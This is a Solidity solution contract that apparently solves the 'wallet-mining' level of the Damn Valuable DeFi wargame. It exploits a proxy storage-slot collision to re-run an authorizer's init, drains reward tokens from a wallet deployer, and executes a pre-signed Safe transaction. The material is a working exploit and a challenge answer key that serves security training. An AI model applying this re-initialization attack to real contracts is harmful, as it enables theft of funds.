// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Safe, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";

contract Solution {
    constructor(
        address depositAddress,
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        bytes memory initializer,
        uint256 saltNonce,
        DamnValuableToken token,
        bytes memory data,
        bytes memory signature,
        address ward
    ) {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = depositAddress;
        // needsInit != 0,
        // because upgrader's slot in TransparentProxy is the same as
        // needsInit's slot in AuthorizerUpgradeable
        authorizer.init(wards, aims);
        // deploy the proxy and get tokens from the walletDeployer
        walletDeployer.drop(depositAddress, initializer, saltNonce);
        token.transfer(ward, token.balanceOf(address(this)));

        // execute the transaction to send tokens to the user
        Safe(payable(depositAddress)).execTransaction(
            address(token), 0, data, Enum.Operation.Call, 0, 0, 0, address(0), payable(0), signature
        );
    }
}
